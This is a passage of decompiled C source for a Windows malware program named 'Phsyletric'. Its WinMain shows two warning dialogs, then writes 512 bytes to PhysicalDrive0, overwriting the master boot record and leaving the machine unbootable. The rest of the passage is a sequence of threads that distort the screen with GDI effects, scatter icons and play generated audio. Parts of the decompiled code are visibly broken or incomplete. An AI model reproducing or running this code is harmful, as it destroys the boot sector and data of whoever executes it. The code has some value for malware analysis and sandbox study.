			v8 = Rect.bottom;
			v5 = Rect.right;
		}
	}
}
MMRESULT sub_4038B0()
{
	unsigned int v0; // edx
	unsigned int v2; // [esp+4h] [ebp-9C444h]
	struct wavehdr_tag pwh; // [esp+8h] [ebp-9C440h]
	HWAVEOUT phwo; // [esp+28h] [ebp-9C420h]
	WAVEFORMATEX pwfx; // [esp+2Ch] [ebp-9C41Ch]
	char v6[640004]; // [esp+40h] [ebp-9C408h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v6, 0, 0x9C400u);
	v0 = 0;
	v2 = 0;
	do
	{
		v6[v2] = (7 * v2) | (29 * v2) | (v2 >> 9) | v0 & 1 ^ (v2 >> 1) ^ ((v0 & 1) - v0 / 9);
		v0 = v2 + 1;
		v2 = v0;
	} while (v0 < 0x9C400);
	pwh.dwBufferLength = 640000;
	pwh.lpData = v6;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void __stdcall sub_402250(LPVOID lpThreadParameter)
{
	HWND v1; // esi
	HDC v2; // edi
	struct tagRECT Rect; // [esp+Ch] [ebp-18h]

	while (1)
	{
		v1 = GetDesktopWindow();
		GetWindowDC(v1);
		v2 = GetDC(0);
		GetWindowRect(v1, &Rect);
		SetStretchBltMode(v2, 4);
		rand();
		rand();
		rand();
		rand();
		BitBlt(v2, Rect.left + 1, Rect.top + 1, Rect.right + 1, Rect.bottom + 1, v2, Rect.left, Rect.top, 0xEE0086u);
		rand();
		rand();
		rand();
		rand();
		BitBlt(v2, Rect.left - 1, Rect.top - 1, Rect.right + 1, Rect.bottom - 1, v2, Rect.left, Rect.top, 0x660046u);
		Sleep(0xAu);
	}
}
void __stdcall sub_402320(LPVOID lpThreadParameter)
{
	int v1; // edi
	int v2; // ebx
	HDC v3; // esi
	bool v4; // zf
	signed int v5; // eax
	int v6; // [esp-8h] [ebp-14h]

	GetDC(0);
	v1 = GetSystemMetrics(0);
	v2 = GetSystemMetrics(1);
	while (1)
	{
		v3 = GetDC(0);
		v5 = rand() & 0x80000003;
		v4 = v5 == 0;
		if (v5 < 0)
			v4 = (((BYTE)v5 - 1) | 0xFFFFFFFC) == -1;
		if (v4)
		{
			BitBlt(v3, 0, 0, v1, v2, v3, -90, 20, 0xCC0020u);
			goto LABEL_13;
		}
		if (rand() % 4 == 1)
			break;
		if (rand() % 4 == 2)
		{
			BitBlt(v3, 0, 0, v1, v2, v3, -90, -20, 0xCC0020u);
			goto LABEL_13;
		}
		if (rand() % 4 == 3)
		{
			v6 = 20;
			goto LABEL_12;
		}
	LABEL_13:
		Sleep(1u);
	}
	v6 = -20;
LABEL_12:
	BitBlt(v3, 0, 0, v1, v2, v3, 90, v6, 0xCC0020u);
	goto LABEL_13;
}
void sub_4023F0()
{
	HDC v0; // edi
	HWND v1; // eax
	struct tagRECT Rect; // [esp+Ch] [ebp-2Ch]
	POINT Point; // [esp+1Ch] [ebp-1Ch]
	int v4; // [esp+24h] [ebp-14h]
	int v5; // [esp+28h] [ebp-10h]
	int v6; // [esp+2Ch] [ebp-Ch]
	int v7; // [esp+30h] [ebp-8h]

	v0 = GetDC(0);
	GetSystemMetrics(0);
	GetSystemMetrics(1);
	v1 = GetDesktopWindow();
	GetWindowRect(v1, &Rect);
	Point.x = rand() % 110 + Rect.left - 50;
	Point.y = rand() % 210 + Rect.top - 100;
	v4 = rand() % 210 + Rect.right - 100;
	v5 = rand() % 410 + Rect.top - 200;
	v6 = Rect.left - rand() % 210;
	v7 = rand() % 210 + Rect.bottom - 200;
	PlgBlt(v0, &Point, v0, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
	Sleep(2u);
}
void sub_4024F0()
{
	HDC v0; // edi
	HWND v1; // eax
	struct tagRECT Rect; // [esp+Ch] [ebp-2Ch]
	POINT Point; // [esp+1Ch] [ebp-1Ch]
	int v4; // [esp+24h] [ebp-14h]
	int v5; // [esp+28h] [ebp-10h]
	int v6; // [esp+2Ch] [ebp-Ch]
	int v7; // [esp+30h] [ebp-8h]

	v0 = GetDC(0);
	GetSystemMetrics(0);
	GetSystemMetrics(1);
	v1 = GetDesktopWindow();
	GetWindowRect(v1, &Rect);
	Point.x = Rect.left - rand() % 110 + 50;
	Point.y = Rect.top - rand() % 210 + 100;
	v4 = Rect.right - rand() % 210 + 100;
	v5 = Rect.top - rand() % 410 + 200;
	v6 = Rect.left + rand() % 210;
	v7 = Rect.bottom - rand() % 210 + 200;
	PlgBlt(v0, &Point, v0, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
	Sleep(2u);
}
void __stdcall sub_4025F0(LPVOID lpThreadParameter)
{
	while (1)
	{
		sub_4023F0();
		sub_4024F0();
		sub_4024F0();
		sub_4023F0();
	}
}
void __stdcall sub_402610(LPVOID lpThreadParameter)
{
	HDC(__stdcall *v1)(HWND); // ebx
	HDC v2; // ebx
	int v3; // esi
	int v4; // edi
	int v5; // eax
	HBRUSH v6; // eax
	int w; // [esp+Ch] [ebp-8h]
	int h; // [esp+10h] [ebp-4h]

	v1 = GetDC;
	GetDC(0);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	while (1)
	{
		v2 = v1(0);
		v3 = (unsigned __int8)(rand() % 255) << 8;
		v4 = (v3 | (unsigned __int8)(rand() % 255)) << 8;
		v5 = rand();
		v6 = CreateSolidBrush(v4 | (unsigned __int8)(v5 % 255));
		SelectObject(v2, v6);
		PatBlt(v2, 0, 0, w, h, 0x5A0049u);
		Sleep(0x3E8u);
		v1 = GetDC;
	}
}
void __stdcall sub_4026B0(LPVOID lpThreadParameter)
{
	HDC v1; // esi
	struct tagCURSORINFO pci; // [esp+10h] [ebp-24h]
	struct tagPOINT Point; // [esp+24h] [ebp-10h]

	GetDC(0);
	while (1)
	{
		v1 = GetDC(0);
		GetCursorPos(&Point);
		GetCursorInfo(&pci);
		pci.cbSize = 20;
		DrawIcon(v1, Point.x, Point.y, pci.hCursor);
	}
}
void sub_402710(LPVOID lpThreadParameter)
{
	HDC(__stdcall *v2)(HWND); // ebx
	int v3; // edi
	HDC v4; // ebx
	int v5; // edi
	int v6; // xmm1
	int v7; // xmm0
	int v8 = 0; // edi
	float v9 = 0; // xmm0_4
	int v10; // esi
	HICON v11; // eax
	HICON v12; // eax
	HICON v13; // eax
	HICON v14; // eax
	HICON v15; // eax
	int i; // [esp+Ch] [ebp-14h]
	int v17; // [esp+10h] [ebp-10h]
	int v18; // [esp+14h] [ebp-Ch]
	int v19; // [esp+18h] [ebp-8h]
	int v20; // [esp+1Ch] [ebp-4h]

	v2 = GetDC;
	GetDC(0);
	v3 = GetSystemMetrics(0);
	v18 = v3;
	v17 = GetSystemMetrics(1);
	while (1)
	{
		v4 = v2(0);
		v19 = rand() % v3;
		v20 = rand() % v17;
		rand();
		v5 = 0;
		for (i = 0; v5 < v18 + v17; i = v5)
		{
			v6 = 0i64;
			
			v7 = 0i64;
			
		
			v10 = (int)v9;
			if (!(rand() % 5))
			{
				v11 = LoadIconW(0, (LPCWSTR)0x7F01);
				DrawIcon(v4, v8, v10, v11);
				Sleep(0);
			}
			if (!(rand() % 5))
			{
				v12 = LoadIconW(0, (LPCWSTR)0x7F03);
				DrawIcon(v4, v8, v10, v12);
				Sleep(0);
			}
			if (!(rand() % 5))
			{
				v13 = LoadIconW(0, (LPCWSTR)0x7F04);
				DrawIcon(v4, v8, v10, v13);
				Sleep(0);
			}
			if (!(rand() % 5))
			{
				v14 = LoadIconW(0, (LPCWSTR)0x7F04);
				DrawIcon(v4, v8, v10, v14);
				Sleep(0);
			}
			if (!(rand() % 5))
			{
				v15 = LoadIconW(0, (LPCWSTR)0x7F04);
				DrawIcon(v4, v8, v10, v15);
				Sleep(0);
			}
			v5 = i + 1;
		}
		InvalidateRect(0, 0, 0);
		v2 = GetDC;
		v3 = v18;
	}
}
void __stdcall sub_402920(LPVOID lpThreadParameter)
{
	int v1; // edi
	int v2; // ebx
	HDC v3; // esi

	GetDC(0);
	v1 = GetSystemMetrics(0);
	v2 = GetSystemMetrics(1);
	while (1)
	{
		v3 = GetDC(0);
		SetStretchBltMode(v3, 4);
		StretchBlt(v3, 30, 30, v1 - 60, v2 - 60, v3, v1, v2, -v1, -v2, 0xCC0020u);
		Sleep(0x96u);
	}
}
void sub_402990(LPVOID lpThreadParameter)
{
	HDC(__stdcall *v1)(HWND); // ebx
	int v2; // edi
	int v3; // ebx
	int v4; // edi
	int v5; // esi
	int v6; // eax
	int v7; // eax
	int v8; // eax
	int v9; // [esp+Ch] [ebp-10h]
	int x; // [esp+10h] [ebp-Ch]
	HDC hdc; // [esp+14h] [ebp-8h]
	int x1; // [esp+18h] [ebp-4h]

	v1 = GetDC;
	GetDC(0);
	v2 = GetSystemMetrics(0);
	v9 = v2;
	GetSystemMetrics(1);
	while (1)
	{
		hdc = v1(0);
		x = rand() % v2 - 400;
		rand();
		x1 = rand() % v2 - 400;
		v3 = rand() % v2 - 400;
		v4 = rand() % 400;
		v5 = rand() % 400;
		v6 = rand() % 2;
		BitBlt(hdc, x, v3, v4, v5, hdc, x1, v3, v6 != 0 ? 1114278 : 4457256);
		v7 = rand() % 2;
		BitBlt(hdc, x, v3, v4, v5, hdc, x1, v3, v7 != 0 ? 15597702 : 3342344);
		v8 = rand() % 2;
		BitBlt(hdc, x, v3, v4, v5, hdc, x1, v3, v8 != 0 ? 8913094 : 13369376);
		Sleep(0x96u);
		v1 = GetDC;
		v2 = v9;
	}
}
void __stdcall sub_402AC0(LPVOID lpThreadParameter)
{
	HWND(__stdcall *v1)(); // edi
	HWND v2; // eax
	void(__stdcall *v3)(HWND); // ebx
	int v4; // esi
	HWND v5; // eax
	HDC v6; // ebx
	int v7; // esi
	int v8; // edi
	int v9; // eax
	HBRUSH v10; // eax
	int v11; // eax
	HICON v12; // eax
	int v13; // [esp-1Ch] [ebp-40h]
	int v14; // [esp-Ch] [ebp-30h]
	int v15; // [esp-8h] [ebp-2Ch]
	int cy; // [esp+Ch] [ebp-18h]
	int v17; // [esp+10h] [ebp-14h]
	struct tagPOINT Point; // [esp+14h] [ebp-10h]

	v1 = GetForegroundWindow;
	v2 = GetForegroundWindow();
	v3 = (void(__stdcall *)(HWND))GetDC;
	GetDC(v2);
	GetDC(0);
	v17 = GetSystemMetrics(0);
	v4 = GetSystemMetrics(1);
	cy = v4;
	while (1)
	{
		v5 = v1();
		v3(v5);
		v6 = ((HDC(__stdcall *)(HWND))v3)(0);
		GetCursorPos(&Point);
		BitBlt(v6, -1, 1, v17, v4, v6, 2, 2, 0x330008u);
		v7 = (unsigned __int8)(rand() % 255) << 8;
		v8 = (v7 | (unsigned __int8)(rand() % 255)) << 8;
		v9 = rand();
		v10 = CreateSolidBrush(v8 | (unsigned __int8)(v9 % 255));
		SelectObject(v6, v10);
		v15 = rand() % 11;
		v4 = cy;
		v14 = -rand() % 11;
		v13 = rand() % 15;
		v11 = rand();
		BitBlt(v6, -v11 % 15, v13, v17, cy, v6, v14, v15, 0x2837E28u);
		v12 = LoadIconW(0, (LPCWSTR)0x7F01);
		DrawIcon(v6, Point.x, Point.y, v12);
		v3 = (void(__stdcall *)(HWND))GetDC;
		v1 = GetForegroundWindow;
	}
}
void __stdcall sub_402BF0(LPVOID lpThreadParameter)
{
	int v1; // ebx
	int v2; // esi
	HDC v3; // edi
	int v4; // ecx
	int v5; // esi
	char v6; // al
	char v7; // bl
	char v8; // al
	char v9; // dl
	int v10; // eax
	int v11; // [esp+10h] [ebp-24h]
	int v12; // [esp+14h] [ebp-20h]
	LONG cb; // [esp+18h] [ebp-1Ch]
	int v14; // [esp+1Ch] [ebp-18h]
	int v15; // [esp+20h] [ebp-14h]
	HBITMAP hbit; // [esp+24h] [ebp-10h]
	HDC hdc; // [esp+28h] [ebp-Ch]
	void *lpBits; // [esp+2Ch] [ebp-8h]
	char v19; // [esp+33h] [ebp-1h]

	v1 = GetSystemMetrics(0);
	v11 = v1;
	v2 = GetSystemMetrics(1);
	v14 = v2;
	lpBits = VirtualAlloc(0, 4 * v1 * (v2 + 1), 0x3000u, 4u);
	v15 = v1 * v2;
	cb = 4 * v1 * v2;
	while (1)
	{
		v3 = GetDC(0);
		hdc = CreateCompatibleDC(v3);
		hbit = CreateBitmap(v1, v2, 1u, 0x20u, lpBits);
		SelectObject(hdc, hbit);
		BitBlt(hdc, 0, 0, v1, v2, v3, 0, 0, 0xCC0020u);
		GetBitmapBits(hbit, cb, lpBits);
		v4 = 0;
		if (v15 > 0)
		{
			v19 = v1 + 1;
			v5 = (int)lpBits + 2;
			v12 = v1 / v14;
			v6 = v14 + 1;
			do
			{
				v5 += 4;
				v7 = v4 * v6;
				v8 = v4++;
				v9 = v8 * v19;
				v6 = v14 + 1;
				*(BYTE *)(v5 - 4) = v7 | (v12 + 2 * v7 - 1 + v9);
			} while (v4 < v15);
			v1 = v11;
			v2 = v14;
		}
		SetBitmapBits(hbit, cb, lpBits);
		BitBlt(v3, 0, 0, v1, v2, hdc, 0, 0, 0x440328u);
		DeleteObject(hbit);
		DeleteObject(hdc);
		DeleteObject(v3);
		v10 = rand();
		Sleep(v10 % 100);
	}
}



int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HANDLE v4; // esi
	HANDLE v5; // esi
	HANDLE v6; // edi
	HANDLE v7; // esi
	HANDLE v8; // esi
	HANDLE v9; // esi
	HANDLE v10; // esi
	HANDLE v11; // esi
	HANDLE v12; // esi
	HANDLE v13; // esi
	HANDLE v14; // edi
	HANDLE v15; // esi
	HANDLE v16; // esi
	HANDLE v17; // esi
	HANDLE v18; // esi
	HANDLE v19; // ebx
	HANDLE v20; // edi
	HANDLE v21; // esi
	HANDLE v22; // esi
	HANDLE v23; // esi
	int result = 0; // eax
	HANDLE hThread; // [esp+Ch] [ebp-Ch]
	DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h]

	if (MessageBoxW(
		0,
		L"The software you just executed is considered malware.\r\n"
		"This malware will harm your computer and makes it unusable.\r\n"
		"If you are seeing this message without knowing what you just executed, simply press No and nothing will happen"
		".\r\n"
		"If you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n"
		"\r\n"
		"DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?",
		L"Phsyletric",
		0x34u) == 7
		|| MessageBoxW(
			0,
			L"THIS IS THE LAST WARNING!\r\n"
			"\r\n"
			"THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n"
			"STILL EXECUTE IT?",
			L"Phsyletric",
			0x34u) == 7)
	{
		ExitProcess(0);
	}
	v4 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
	WriteFile(v4, "ë", 0x200u, &NumberOfBytesWritten, 0);
	CloseHandle(v4);
	v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
	sub_402D60();
	Sleep(0x7530u);
	TerminateThread(v5, 0);
	CloseHandle(v5);
	InvalidateRect(0, 0, 0);
	v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401130, 0, 0, 0);
	v7 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4012D0, 0, 0, 0);
	sub_402F30();
	Sleep(0x7530u);
	TerminateThread(v6, 0);
	TerminateThread(v7, 0);
	CloseHandle(v6);
	CloseHandle(v7);
	InvalidateRect(0, 0, 0);
	v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401410, 0, 0, 0);
	sub_4030E0();
	Sleep(0x3A98u);
	TerminateThread(v8, 0);
	CloseHandle(v8);
	InvalidateRect(0, 0, 0);
	v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401580, 0, 0, 0);
	sub_403290();
	Sleep(0x61A8u);
	TerminateThread(v9, 0);
	CloseHandle(v9);
	InvalidateRect(0, 0, 0);
	v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401970, 0, 0, 0);
	Sleep(0x61A8u);
	TerminateThread(v10, 0);
	CloseHandle(v10);
	v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401990, 0, 0, 0);
	sub_403440();
	Sleep(0x3A98u);
	TerminateThread(v11, 0);
	CloseHandle(v11);
	v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401BB0, 0, 0, 0);
	sub_4035F0();
	Sleep(0x61A8u);
	TerminateThread(v12, 0);
	CloseHandle(v12);
	v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401D80, 0, 0, 0);
	sub_403740();
	Sleep(0x61A8u);
	TerminateThread(v13, 0);
	CloseHandle(v13);
	v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401EC0, 0, 0, 0);
	v15 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402090, 0, 0, 0);
	sub_4038B0();
	Sleep(0x4E20u);
	TerminateThread(v14, 0);
	TerminateThread(v15, 0);
	CloseHandle(v14);
	CloseHandle(v15);
	v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402250, 0, 0, 0);
	sub_4038B0();
	Sleep(0x61A8u);
	TerminateThread(v16, 0);
	CloseHandle(v16);
	v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402320, 0, 0, 0);
	Sleep(0x61A8u);
	TerminateThread(v17, 0);
	CloseHandle(v17);
	v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4025F0, 0, 0, 0);
	Sleep(0x61A8u);
	TerminateThread(v18, 0);
	CloseHandle(v18);
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402610, 0, 0, 0);
	NumberOfBytesWritten = (DWORD)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4026B0, 0, 0, 0);
	v19 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402710, 0, 0, 0);
	v20 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402920, 0, 0, 0);
	v21 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402990, 0, 0, 0);
	Sleep(0x61A8u);
	TerminateThread(hThread, 0);
	TerminateThread((HANDLE)NumberOfBytesWritten, 0);
	TerminateThread(v19, 0);
	TerminateThread(v20, 0);
	TerminateThread(v21, 0);
	CloseHandle(hThread);
	CloseHandle((HANDLE)NumberOfBytesWritten);
	CloseHandle(v19);
	CloseHandle(v20);
	CloseHandle(v21);
	v22 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402AC0, 0, 0, 0);
	Sleep(0x3A98u);
	TerminateThread(v22, 0);
	CloseHandle(v22);
	v23 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402BF0, 0, 0, 0);
	Sleep(0x3A98u);
	TerminateThread(v23, 0);
	CloseHandle(v23);
	Sleep(0xFFFFFFFF);
	return result;
}